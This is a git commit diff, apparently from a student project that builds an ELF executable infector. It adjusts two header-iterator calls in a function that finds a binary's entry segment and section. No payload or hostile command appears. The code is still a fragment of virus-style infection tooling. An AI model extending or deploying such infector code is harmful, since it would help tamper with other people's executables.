93940f65d867fc8fc5a8fb34fdfac19487a40fff
nicolhaq <nhaquet@student.42.fr>
2019-06-05 05:10:41 +0200

    [TOUCH]Position idependant itearator

--- srcs/infect/elf64/elf64_find_entry.c
+++ srcs/infect/elf64/elf64_find_entry.c
@@ -68,12 +68,12 @@ bool		find_entry(struct entry *original_entry, f_safe_accessor safe)
 	bzero(original_entry, sizeof(*original_entry));
 	stored_entry = original_entry;
 
-	if (!foreach_phdr(safe, find_entry_phdr))
+	if (!foreach_phdr(safe, find_entry_phdr, void))
 		return (errors(ERR_THROW, "find_entry"));
 	if (!original_entry->safe_phdr)
 		return (errors(ERR_CORRUPT, "missing entry segment"));
 
-	if (!foreach_shdr(safe, find_entry_shdr))
+	if (!foreach_shdr(safe, find_entry_shdr, void))
 		return (errors(ERR_THROW, "find_entry"));
 	if (!original_entry->safe_shdr)
 		return (errors(ERR_CORRUPT, "missing entry section"));
